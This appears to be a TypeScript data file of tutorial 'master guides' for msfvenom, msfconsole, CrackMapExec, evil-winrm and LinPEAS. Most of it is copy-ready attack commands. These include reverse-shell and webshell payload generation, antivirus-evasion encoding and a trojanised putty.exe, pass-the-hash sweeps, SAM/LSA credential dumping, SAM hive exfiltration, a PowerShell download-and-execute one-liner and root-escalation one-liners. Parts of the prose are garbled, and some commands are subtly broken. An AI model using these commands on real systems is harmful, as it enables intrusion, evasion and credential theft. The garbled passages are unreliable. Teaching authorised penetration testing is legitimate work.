import type { MasterGuide } from "../types";

export const MASTER_GUIDES_5: MasterGuide[] = [
  {
    slug: "msfvenom",
    tagline: "payload generator & encoder",
    intro: `**msfvenom** is the payload factory of the Metasploit framework: it generates the executable byte that lands your next step — a reverse shell, a meterpreter stage, a Windows/Linux/macOS/webshell artifact — and encodes/obfuscates it past simple AV. Every tool in the "exploit" phase eventually whispers "generate me something with msfvenom".

### Why it matters
Exploitation is only half the loop; the *delivery* is where practical control lives. msfvenom packages your foot-in-the-door as a file (exe, php, asp, war, msf), encodes/flattens it to survive simple signature scanners, and keeps the payload talking back to your listener. It is also the fastest way to understand the payload-stager-payload distinction you'll see twenty times again in post-exploitation.

### Install

\`\`\`bash
sudo apt install metasploit-framework
msfvenom --list payloads | head -40
\`\`\`

**Scoped**: generating payloads is legal; *running* them against a system requires your authorized engagement's blessing. Delivery to a victim is an attack action — be clear on that line.`,
    sections: [
      {
        title: "The recipe: payload, target, encoder, format",
        md: `\`\`\`bash
msfvenom -p <payload> LHOST=<your-ip> LPORT=<port> -f <format> -o <file>
\`\`\`

The coordinates in order:
1. **\`-p\` payload type** — what runs when delivered. Reverse TCP (\`linux/x64/shell_reverse_tcp\`) vs staged (\`meterpreter\` variants) differ: staged = small first-stage that fetches the rest; unstaged = the whole shell in one blob.
2. **LHOST / LPORT** — where home is. LHOST must be reachable, LPORT must be listenable (your listener, usually \`nc -lvnp\` or a \`msfconsole\` handler).
3. **\`-f\` format** — \`exe\`, \`elf\` (Linux), \`macho\` (macOS), \`php\`, \`asp\`, \`war\`, \`raw\` — matches the *receiver's platform*, not yours.
4. **\`-o\`** output path.

**Ask-first**: \`listening on :4444\` is meaningless if nothing is listening on :4444. Always pair the serve with the listener.`,
      },
      {
        title: "LHOST, LPORT & the reverse rule",
        md: `\`\`\`bash
# the pattern that matters (REVERSE, not bind):
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o met.exe
# the same idea lighter: linux/x86/shell_reverse_tcp file uploads
\`\`\`

- **Reverse** (victim connects out to you) beats **bind** (you connect in to victim) almost always — NAT/firewalled ingress is rare out to you; bind shells die the moment the victim boxes network-egresses you.
- **Bad LPORT behaviour**: \`nc -lvnp 4444\` before you deliver, or the first shell attempt recurs instantly.
- **Urban myth that won't quit**: "use port 4444, it's the metasploit default" — 4444 is scanned and re-blocked everywhere. Pick a quiet high port (8080, 443-adjacent, 1337-anything-but-4444) when plausible.`,
      },
      {
        title: "Encoders & AV-evasion framing",
        md: `\`\`\`bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -x putty.exe -k -o putty-hid.exe
\`\`\`

- **\`-e encoder , -i iterations\`** (x86/shikata_ga_nai is the classic) re-shuffles payload bytes to dodge signature AV. Realistically this scratches old localStorage-style signature AV, not modern behavioral/EDR — plan your expectations accordingly.
- **Template injection (\`-x\`)** wraps a payload inside a legit binary (\`putty.exe\`) — a dropper-ish disguise; \`-k\` keeps behavior.
- **The honesty section**: AV/EDR evasion beyond a smoke-test basic encode is a specialist's war fought in C2 and shellcode research — msfvenom is the appetizer, not the meal. In a lab, document that clearly.`,
      },
      {
        title: "Web-deliverable payloads",
        md: `\`\`\`bash
# PHP (great for upload/app exploit pivots)
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
# ASPX (Windows IIS)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o upload.aspx
# WAR (Tomcat/manager-deploy)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
\`\`\`

The web payload is your "connect to the app layer" answer: upload-to-rce (through a file upload vuln), IIS/ASPX app handler, Tomcat manager deploys. The format is *the receiver's execution context*, not your own — the single most common msfvenom mistake is \`-f exe\` trying to reach an IIS.`,
      },
      {
        title: "Payload herding: listener-first, chaos-avoidance",
        md: `\`\`\`bash
# the discipline:
# 1) open listener BEFORE delivery
nc -lvnp 4444
# or with msfconsole handler for meterpreter:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
run
\`\`\`

Confusion points the master avoids:
- **Listener yet?** A surprise inbound shell that hits "nothing listening" is a ghost — nothing happened anywhere and it looks like your payload failed. Listener first.
- **Payload/listener mismatch**: \`meterpreter\` payload with a \`nc\` listener gives you a raw shell, not meterpreter; staged payloads need a stage handler (msfconsole or a stager-aware listener). Match or accept the raw-shell reality.
- **One thing per payload**: LHOST typo = callback to a dead IP; verify twice.`,
      },
      {
        title: "Pitfalls & pro habits",
        md: `- **Format vs receiver** — always check: IIS wants \`aspx\`, Tomcat \`war\`, Apache \`php\`, bare metal \`elf/exe\`.
- **LHOST must be YOUR reachable address** — in a VM/NAT lab that's the bridge IP, not the loopback.
- **Linux entropy** — a null "eth0 not present" in IRC-light setups; run \`ifconfig\` and think about which IP the victim can actually reach.
- **Payload size races** — some upload forms truncate big payloads (newline/base64 oddities); \`-f exe -k -x\` and \`--smallest\` variants help.
- Pair msfvenom with its siblings: \`msfconsole msfvenom\` handler, then \`meterpreter\` post-modules, \`hashdump\`, \`getsystem\`; or hand the raw shell to your \`linpeas\`/post ritual.

**Mastery sign**: you build a \`linux/x64/shell_reverse_tcp\` \`.elf\`, encode it for a target that blocks plain payloads, open the matching listener, deliver, and get a shell in the exact architecture you chose — with every field (LHOST/LPORT/-f/-e) explained from memory.`,
      },
    ],
  },
  {
    slug: "msfconsole",
    tagline: "Metasploit framework command line",
    intro: `**msfconsole** is the interactive heart of the Metasploit framework: a console where you search modules, point them at targets, run exploits, and manage sessions — plus a built-in NC-like handler that catches the payloads msfvenom built. One tool, four verbs that unlock a whole engagement loop: \`use\`, \`set\`, \`run\`, and \`sessions\`.

### Why it matters
Exploitation frameworks exist because stage-by-stage manual exploitation (source → compile → port → upload → execute) is the slow path. Metasploit's module library (exploits, payloads, post, aux) automates the known-evolving part, and msfconsole is where you drive it. It's also where meterpreter sessions come to live: \`getsystem\`, \`hashdump\`, \`getuid\` are a RAT-grade post-exploit suite out of the box.

### Install

\`\`\`bash
sudo apt install metasploit-framework
msfconsole -q
\`\`\`

### First moves

\`\`\`text
help                 # the whole command set
search samba        # find modules
\`\`\`

**Authorised scope: exploit modules make contact with a target. Everything below assumes you're cleared for it.`,
    sections: [
      {
        title: "The console verbs — use, set, run",
        md: `\`\`\`bash
msfconsole -q
use exploit/multi/handler        # a tool in the context of "the loop"
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 7777
run
\`\`\`

- **\`use\`** loads a module into context (a module is a *template*, options still be set).
- **\`set\`** fills the module's options; \`set\` with \`unset\` or \`-l\` lists. To blank one: \`unset <option>\`.
- **\`run\`//\`exploit\`** launches the module against the set options.
- **\`show options\`** is your sanity page: required (\`RHOSTS\` — the target! \`LHOST\` — your callback!) with defaults. **The two-host confusion kills more sessions than any exploit bug**: RHOSTS = victim, LHOST = you.`,
      },
      {
        title: "search, info, and choosing modules right",
        md: `\`\`\`text
search type:exploit samba        # by family
search windows rdp               # by product
search CVE-2020-1472             # by CVE
info exploit/...                 # full details: targets, options, description
\`\`\`

- **\`search\`** filters by \`type:\`, name, CVE, \`platform:\`, \`arch:\`. The master habit: search the *specific service+version*, read \`info\`, check the \`disclosure date\` and \`author\` (and whether targets line up with your architecture) before \`use\`.
- **Rank field** (excellent/great/good/...) is a coarse "works vs sometimes-breaks" signal — excellent isn't guaranteed, but it knows it mostly works.
- **Aux modules outnumber exploits 5:1** — \`auxiliary/scanner/*\` is your credentialed+interesting-script reconnaissance, and \`search scanner\` surfaces them.`,
      },
      {
        title: "Sessions — the payoff state",
        md: `\`\`\`text
sessions -l                 # list live shells
sessions -i 1               # interact
background                  # keep it alive while you work elsewhere
sessions -k 1               # kill
background; use post/...    # pivot without losing the shell
\`\`\`

- **Reverse-handler sessions** (from your \`multi/handler\`) become *interactive* with \`sessions -i\`.
- **Background ≠ close**: kids kill sessions by Ctrl-C-ing the wrong window; train the instinct to \`background\` then \`sessions -i\` to hop races.
- On a meterpreter shell: \`getuid\`, \`sysinfo\`, \`getsystem\` (privilege escalation attempt), \`hashdump\` (NTLM) — the "I'm in, widen it" suite. On a \`cmd\`/raw shell, fall back to the OS rhythm (\`id\`, \`whoami /priv\`, \`linpeas\`).`,
      },
      {
        title: "db_nmap + db commands — evidence without exit",
        md: `\`\`\`text
db_nmap -Pn -sV 10.10.10.0/24     # NMAP results INTO msf database
services                          # list scanned services
hosts                             # hosts known
vulns                             # correlated vulnerability rows
use auxiliary/scanner/smb/smb_version ; run
\`\`\`

- **\`db_nmap\`** runs Nmap *inside* msf and stores results — then \`search\` and module targeting reference that knowledge (hosts, services, vulns views) without retyping.
- **The pro motion**: \`db_nmap -sV\` → \`services\` → craft module pick (search the version) → \`use + run\` → session. Evidence (who/what/where) stays in the framework for \`db_export\` reports.
- **Aux scanners** (\`smb_version\`, \`http_version\`, \`ssh_version\`) corroborate versions quickly — the "identify, then exploit" loop without a browser tab.`,
      },
      {
        title: "Pitfalls & pro habits",
        md: `- **RHOSTS/LHOST dyslexia** — victim vs your listener. Check \`show options\` before \`run\`.
- **Never \`run\` with a dead listener** — handler must be up (or the module's own payload handler) or the callback lands nowhere.
- **Verbose learns**: \`set VERBOSE true\` shows response details; \`exploit -j\` jobs the session in the background.
- Cycles lean (msfconsole + nmap + msfvenom + linpeas) beat a single-menu dependency every time.
- **Engagement hygiene**: \`setg\` global vars simplify; write \`resource\` scripts for repeatable flows; export \`db_export\` before you close the day's session.

**Mastery sign**: from a fresh \`msfconsole -q\`, you \`db_nmap -sV\`, pick the right module for the version, run \`use/set/run\`, land on a meterpreter session, \`getsystem\`+hashdump, and background-first through four more — all without leaving the console.`,
      },
    ],
  },
  {
    slug: "crackmapexec",
    tagline: "post-exploitation AD swiss army knife",
    intro: `**CrackMapExec (cme)** is the post-exploitation toolkit for Windows/Active Directory networks: one executive saying \`smb\`, \`winrm\`, \`ldap\`, \`mssql\`, \`ssh\`, and one credential set (password or NTLM hash) sweeps an entire subnet — validating access, dumping SAM/hashes/LSA, finding admin groups, and executing remotely. It's the tool that answers "I have one credential; where does it actually work across the estate?".

### Why it matters
Post-exploitation is iteration at scale: you recovered (or guessed) a user's NTLM hash, and the overt whole-network question is "what boxes can I log into as them, as their group memberships?" Every manual WinRM/RDP/SMB host-check is a slow theater act versus one cme sweep. CME turns "found one hash" into "mapped the lateral-movement surface".

### Install

\`\`\`bash
sudo apt install crackmapexec
cme --help
\`\`\`

(or \`pipx install crackmapexec\`). **Scoped use: a single credential and AD sweeping belong to your authorised network.`,
    sections: [
      {
        title: "The syntax: protocol → creds → hosts",
        md: `\`\`\`bash
crackmapexec smb 10.10.10.0/24 -u bob -p 'P@ssw0rd'
# or share the NTLM hash (pass-the-hash — no password needed!)
crackmapexec smb 10.10.10.0/24 -u bob -H <ntlm-hash>
# and across many users
crackmapexec smb targets.txt -u users.txt -p passwords.txt
# domain-aware (Kerberos-ish, cleaner on real AD)
crackmapexec smb 10.10.10.0/24 -d CORP -u bob -p 'P@ssw0rd'
\`\`\`

**Coordinates**: protocol (\`smb\`, \`winrm\`, \`mssql\`, \`ldap\`, \`ssh\`), creds (\`-u -p\` password or \`-H\` NTLM hash → pass-the-hash), targets (\`range/subnet\` or a file). Output classes each host as \`[+] (admin)\`, \`[+] (Pwn3d!)\`, or failed — \`Pwn3d!\` is active admin-session, gold in a sweep.

**The hash-or-password symmetry**: \`-H\` lets you traverse with a dump (NTLM) alone; \`-p\` uses clear. Both are cme's native idioms.`,
      },
      {
        title: "Sweeps worth running first",
        md: `\`\`\`bash
# who is running, what platform, which shares
crackmapexec smb 10.10.10.0/24 -u bob -p 'P@ssw0rd' --shares
# which hosts let you log in at all (minimal noise)
crackmapexec smb 10.10.10.0/24 -u bob -p 'P@ssw0rd'
# targeted: accounts with admin rights where?
crackmapexec smb 10.10.10.0/24 -u bob -p 'P@ssw0rd' --admin
\`\`\`

- **\`--shares\`** lists readable SMB shares per host — the map of where the interesting files live (and where you'd plant persistence).
- **\`--admin\`** filters sessions that land in built-in admin groups — the lateral-movement shortlist.
- Think *plan over pump*: 100 hosts × credentials checked, then read the pattern (every host with SYSVOL writable = where that TreeOfDir sits).`,
      },
      {
        title: "Compromise actions — SAM/LSA/dump",
        md: `\`\`\`bash
crackmapexec smb 10.10.10.5 -u admin -H <hash> --sam
crackmapexec smb 10.10.10.5 -u admin -H <hash> --lsa
crackmapexec mssql 10.10.10.0/24 -u sa -p 'saPass' --sam        # via DB
crackmapexec smb 10.10.10.5 -u admin -H <hash> --exec-method smbexec -x "whoami"
\`\`\`

- **\`--sam\`** dumps local accounts (workstations joined), **\`--lsa\`** the LSA secrets of the box — both give you NTLM *plus* creds to reuse across the estate.
- **\`-x "<cmd>"\`** (or \`-X\` for powershell) runs a remote command via your session channel — remote execution without a fresh binary; \`--exec-method smbexec\` chooses the transport when both exist.
- **MSSQL/SMB symmetric**: a DB-local \`sa\` account is as good as OS admin via \`--sam\` if the SQL service is admin-privileged — the "DB is the pivot" lesson again.

**Discipline**: \`--sam\`/\`--lsa\` are compromise actions — each box pulled multiplies your surface legally AND forensically. Fragment target lists responsibly.`,
      },
      {
        title: "SMB/LDAP discovery — map before you move",
        md: `\`\`\`bash
crackmapexec smb 10.10.10.0/24 -u bob -p 'x' --users        # enumerate users
crackmapexec ldap 10.10.10.0/24 -u bob -p 'x' --whoami      # current role
crackmapexec ldap 10.10.10.0/24 --scanner <schema/ldap>     # AD-attrs e.g. --users, --groups
\`\`\`

- **\`--users\`** (SMB) sweeps for account names across the subnet — the AD user list feeds whichever cracking/pivot strategy you're on.
- **LDAP verbs** (\`--users\`\*, \`--groups\`, \`--admin-count\`, \`--scanner\`) reach through AD — group membership tells you *why* a credential is \`Pwn3d\` on a host (nested group = accidental admin).
- Graphic epiphany most beginners miss: **CME isn't just "login check"** — it's the read-out of AD relationship data your Sweep would otherwise take hours digging.

**\`--whoami\`** style LDAP checks vouch "yes this user token held the admin session" vs "SMB answer alone".`,
      },
      {
        title: "Detection, defense & pro habits",
        md: `**Defender layers**:
1. **Limit NTLM/PtH surface**: Privileged Access Workstations, tiered accounts, MFA at WinRM/interactive, restricted admin mode, and LAPS for local admin diversity.
2. **Alert the sweep signature**: cme's SAM/LSA dump + remote exec pattern is a well-known EDR/SIEM signature — treat "one box made eyes" as a campaign, not a single event.
3. Separate "service accounts that only need one delegation" from "domain admin everywhere" — cme sweeps reward groups broad bottom-up.
4. Audit \`--sam\`-style retrieval rights: monitor registry/hive reads; Wireshark the weird remote-exec requests.

**Pro habits**:
- Hash over password where possible (\`-H\`); you're validating dumps, not begging logons.
- \`--shares --users\` sweep cheap data before any dump action.
- cme + host file (\`targets.txt\`) = repeatable campaign; save \`-o\`/\`--log\` for the report.
- Pair the cme read with \`--exec-method smbexec\`, \`evil-winrm\` (WinRM shells), and a well-timed \`hashdump\` — the trio of Windows post-exploitation.

**Mastery sign**: given "one user's NTLM hash" and a subnet, you sweep \`smb\` and \`ldap\`, report which hosts are \`Pwn3d!\`, which shares are readable, and which accounts are flag-worthy — without a single manual login dialog.`,
      },
    ],
  },
  {
    slug: "evil-winrm",
    tagline: "Windows remote shell (WinRM)",
    intro: `**evil-winrm** is the cleanest way to get an interactive Windows shell when you hold credentials (or an NTLM hash) and WinRM port 5985/5986 is open. It's PowerShell-based — every session is a PowerShell console delivered over WinRM — and it extends itself with a small but superb toolkit: upload/download, a script/\`Invoke-Expression\` loader for psm1 modules (\`winpeas\`, \`mimikatz\` wrappers), and port-forwarding.

### Why it matters
Between "I proved credentials work" (\`crackmapexec\`) and "I'm a fully interactive shell", evil-winrm is the bridge: it gives you command-and-control over \`Invoke-Expression\`, lets you \`upload\`/\`download\` in-process, and plays the double-agent when your only foot-in-the-door is a WinRM-enabled account — the single most common foothold pattern on modern Windows engagements.

### Install

\`\`\`bash
gem install evil-winrm
evil-winrm -i <target> -u USER -p 'P@ssw0rd'
\`\`\`

### Sanity check

\`\`\`bash
evil-winrm -i 10.10.10.50 -u Administrator -p 'sup3rPa$$'   # needs WinRM open
evil-winrm -i 10.10.10.50 -u USER -H <ntlm-hash>     # pass-the-hash (5985 open)
\`\`\`

**Scoped: WinRM shells are a session against a real OS — comply with your engagement's rules of the road.`,
    sections: [
      {
        title: "Connecting & the shell basics",
        md: `\`\`\`bash
evil-winrm -i 10.10.10.50 -u bob -p 'P@ssw0rd'
evil-winrm -i 10.10.10.50 -u bob -H 8846f7eaee8fb117ad06bdd830b758a8    # NTLM hash → PtH
evil-winrm -i win2019.corp -u svc$ -H <hash> -S      # SSL (5986)
\`\`\`

- WinRM port 5985 (HTTP) / 5986 (HTTPS via \`-S\`). If the box doesn't answer 5985, WinRM isn't your doorway (try SMB/exec or mssql).
- **\`-H\` pass-the-hash** bypasses password-policy entropy entirely — you validate a dumped hash, not a guessed one.
- Session identity: check the *who/whoami* politics early (\`whoami /priv\`, \`whoami /groups\`, \`net user\`, \`net localgroup\`).

**The surprise helper**: \`menu\` lists evil-winrm's built-ins (upload/download/scripts). It's your command window.`,
      },
      {
        title: "PowerShell as the language of post-exploitation",
        md: `\`\`\`text
whoami /priv
net group "Domain Admins" /domain
Get-Content C:\\Users\\Administrator\\Desktop\\flag.txt
dir C:\\
\`Invoke-Expression\` / loader:

scripts /opt/SecLists/misc/example.ps1
\`\`\`

- Everything offensive-PowerShell you know arrives trivially: \`Invoke-Mimikatz\`, \`winPEASx64\`, \`PowerUp\`, \`PowerView\` — put your \`.ps1\` modules in a folder, \`[scripts] <path>\`, then \`Invoke-* \`.
- **The classic ladder**: \`winpeas\` (privilege-uphill sight), \`powerup\` (service/registry weaknesses), \`PowerView\` (AD graph), \`mimikatz\` (credential dump) — each a module you load in-session.
- **Blend with anti-V to taste** — this is offensive opera on the box's own mimetic; just know your noise budget.`,
      },
      {
        title: "upload / download — evidence in and out",
        md: `\`\`\`text
upload /opt/tools/winpeas.exe C:\\Users\\bob\\AppData\\Local\\Temp\\wp.exe
download C:\\Windows\\System32\\config\\SAM C:\\loot\\SAM.bin
\`\`\`

- \`upload\` ships a binary/module/file to the box (temp locations to dodge persistence-scan noise); \`download\` pulls flags/SAM/config loot home.
- **Registry hives**: get them before you crack — \`reg save HKLM\\SAM\` etc, then \`download\`, then Workstation-breaking offline (your NTLM-dump friends).
- There's an implicit Windows-shaped caution: files you copy land on real disks — log scope and clean up your droppings when the engagement closes.`,
      },
      {
        title: "WinRM-specifics & service joins",
        md: `\`\`\`bash
# Only WinRM? Everything still possible via scripts + upload:
crackmapexec winrm 10.10.10.0/24 -u svc$ -H <hash>        # find who answers
evil-winrm -i 10.10.10.50 -u svc$ -H <hash> -s /usr/share/windows-resources/scripts/
\`\`\`

- CME's \`winrm\` protocol is the discovery twin — "which of my hosts answer WinRM with this credential" before you shell each.
- WinRM account → \`--scanner\`/role checks, then the loader does heavy lifting. Every service/DB account delights to pivot to WinRM when 5985 is open.
- Pair the flow: \`evil-winrm\` console is your interactive bay; \`crackmapexec\` sweeps; \`meterpreter\` (when needed) plays the agent — pick by noise and capability, not by habit.

**Reload caveat**: hives are live-locked on Windows; use \`reg save\` (or the winPEAS script route) for a clean quiet capture.`,
      },
      {
        title: "Pitfalls & pro habits",
        md: `- **5985/5986 must be reachable** — 0 auth errors ≠ exploited; port-check first (\`nc -vz\` \`curl -kv https://host:5986\`).
- **NTLM hash needs \`-H\` not \`-p\`** — a pasted hash into \`-p\` reads as a password; symptom "Auth fails with valid hash".
- **WinRM is often restricted for admins** (Remote Management Users quirks) — read \`whoami /groups\` and target realistically.
- **Scripts need the right loader**: \`-s <scripts-dir>\` plus in-meer \`Invoke-Expression\` — mismatch = "not a recognized command."
- Keep your module folder version'd; drop \`-S\`-verbose for SSL quirks; always review Auth history (WinRM logs WinRM events!) — your noise matters.

**Mastery sign**: given a known WinRM-able credential across a subnet, you sweep with CME, shell the right host with evil-winrm, load winpeas, escalate to a privileged identity, and \`download\` the loot — all while counting your event-log footprint.`,
      },
    ],
  },
  {
    slug: "linpeas",
    tagline: "Linux privilege escalation scanner",
    intro: `**LinPEAS** (Linux Privilege Escalation Awesome Script) is the one-shot posture report for a Linux box you've just landed a shell on: it walks the filesystem and processes, reads all the config knobs (SUID binaries, sudo rights, writable paths, cron jobs, creds-in-files, kernel hints), and colours the findings \`RED\`/\`YELLOW\`/\`GREEN\` by likely escalation value. If you're a beginner asking "what do I even try after \`whoami\`?", linpeas is the answer.

### Why it matters
Privilege escalation is a checklist race against the box: every leftover \`/opt\` script, every writable \`/var/www\`, every cron referencing a writable file is a staircase. LinPEAS does in one minute what a manual pentester spends an hour on — and it's your "second brain" the moment you touch Linux post-exploitation. WinPEAS is its Windows sibling; the same eye, different OS.

### Install & run

\`\`\`bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh        # run as your current (low) user — that's the whole trick
\`\`\`

(or \`curl piped to sh\` if wget's blocked). **Scope: runs on the box you legitimately hold a shell on.**`,
    sections: [
      {
        title: "Reading linpeas — the colour language",
        md: `Run, then read top-down with the colour logic:

\`\`\`text
[+] [UPGRADE] /reds? — escalate during the run
[+] Potential password hashes found        # ⚠️ check process env / shadow-ish files
[+] Interesting writable files             # ⚠️ files you can overwrite → cron/web/daemon
[+] Interesting Group writable/SUID        # the classic escalator (see below)
\`\`\`

- **RED/YELLOW = the finding that matters**; green is baseline "rubber-stamp" healthy rows.
- The master read is *combination*, not single rows: "writable \`/var/spool/cron\` + a cron entry running a script in \`/tmp\` = I can plant my own cron job."
- Sections it sweeps (learn the section headers so you can jump): user/group listing, sudo rules, SUID/GUID binaries, cron jobs, PATH/writable dirs, running processes/environment, readable shadow/config, kernel/module hints, network ports.`,
      },
      {
        title: "The five highest-signal findings",
        md: `1. **SUID binaries** (\`-perm -4000\` style) — \`/usr/bin/python3\`+SUID is an instant \`python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'\`.
2. **Writable scripts referenced by cron/root** — overwrite the script, wait for the job, read root output.
3. **Sudo rights you hold** (\`sudo -l\` output) — \`(ALL) NOPASSWD: /usr/bin/find\` etc → \`sudo find . -exec /bin/sh ;\`.
4. **Writable \`/etc\`-adjacent or PATH-adjacent dirs** — if PATH includes \`/tmp\` and a root cron runs a bare command, plant \`ps\`+.
5. **Creds in files** (bash history, \`.env\`, config files readable by you).

**LinPEAS finds; you exploit.** Each red row is a lead, not a guarantee — verify with the actual binary/service, then exploit with a *specific* escalation.`,
      },
      {
        title: "When linpeas finds nothing — then what",
        md: `A quiet linpeas reading is information too:
- **Kernel version line**: if an old kernel is running, \`searchsploit\`/Exploit-DB for that exact family (DirtyPipe/bpf-overflow era) is a real corridor — verified with the OS version, not the distro myth.
- **Custom compilers present (gcc) + writable \`/tmp\`**: your write step is enabled; now find the *why*.
- **Group memberships**: if you're in \`docker\`/\`lxd\`/\`disk\` gate, those become escalators (\`docker run -v /:/mnt -it alpine chroot /mnt\`\...).
- **Services & ports** bound more than \`127.0.0.1\` — internal-only apps are "listen windows" past the firewall story.

The balanced take: "no red" often means *lab hardening worked* — so move to credentialed/custom-priv checks or skip to another host instead of dying on the box.`,
      },
      {
        title: "Windows twin & the full PEASS family",
        md: `\`\`\`powershell
# WinPEAS — same eye for Windows
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASexe/winPEAS/bin/Release/winPEAS.bat')"
\`\`\`
Or the exe/ps1 builds from the releases page. The five Windows signals mirror Linux: unquoted service paths, service permissions, AlwaysInstallElevated, unattended-install leftovers, Credential Manager/hashes in config — every one colored for immediate attention.

**Recon trio**: linpeas (unprivileged posture) → your exploit of a red row → \`linpeas\` again as root to map *deeper* rows now reachable (network internals, shadow, /root prefs). Escalation compounds.`,
      },
      {
        title: "Detection, defense & pro habits",
        md: `**Defender layers**:
1. **Eradicate the red rows Windows/Linux**: no SUID editors, no world-writable dirs in PATH, cron runs absolute paths, sudo minimal, \`noexec\` on \`/tmp\` where workload allows.
2. **Audit with the same tool** — run linpeas on your baseline and treat "red" as debt.
3. Kernel patching discipline removes the "old kernel" corridor entirely.
4. Hunting: linpeas run = process churn + file reads; EDR that surprises on bulk-fileread patterns catches scanners before your exploit.

**Pro habits**:
- **Always \`-a\`\`--fast\` where noise is your budget**, or \`--timeout 60s\`; most value is in the first minute.
- Run it unprivileged *only* — root run notes nothing a low user couldn't (the interesting rows are "as you are").
- Save the run: \`./linpeas.sh > /tmp/linpeas.txt\` — a report on disk beats a scrolled-away screen.
- Chain: linpeas → exploit → re-linpeas-as-root → your post-ex (hashdump, /root/.ssh, env).

**Mastery sign**: fifty lines into a \`linpeas.sh\` run, you've already flagged the SUID python3 and the writable cron script, and you're *finding the matching PrEP* to raise your shell — not re-reading the section header.`,
      },
    ],
  },
];